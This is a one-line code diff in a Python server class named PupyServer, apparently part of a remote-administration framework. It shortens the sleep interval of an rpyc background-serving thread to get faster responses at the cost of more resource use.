@@ -331,7 +331,7 @@ class PupyServer(threading.Thread):
         stream=launcher.iterate().next()
         conn=rpyc.utils.factory.connect_stream(stream, PupyService.PupyBindService, {})
         bgsrv=rpyc.BgServingThread(conn)
-        bgsrv.SLEEP_INTERVAL=0.01 # consume ressources but faster response ...
+        bgsrv.SLEEP_INTERVAL=0.001 # consume ressources but faster response ...
          
 
     def run(self):
